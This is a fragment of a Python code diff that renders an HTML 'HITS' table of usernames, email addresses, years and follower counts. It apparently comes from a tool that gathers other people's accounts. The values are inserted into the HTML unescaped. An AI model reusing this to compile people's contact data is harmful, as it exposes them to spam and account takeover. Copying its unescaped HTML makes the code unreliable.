+    th,td{border:1px solid #333;padding:8px;text-align:left}
+    th{background:#1a1a1a;color:#ffd700}
+    </style></head><body><h1>HITS</h1><table><tr><th>#</th><th>User</th><th>Email</th><th>Year</th><th>Followers</th></tr>"""
+    for i, h in enumerate(hits, 1):
+        html += f"<tr><td>{i}</td><td>@{h[0]}</td><td>{h[1]}</td><td>{h[2]}</td><td>{h[3]}</td></tr>"
+    html += "</table></body></html>"
+    return html
 
 app = _Core()
 
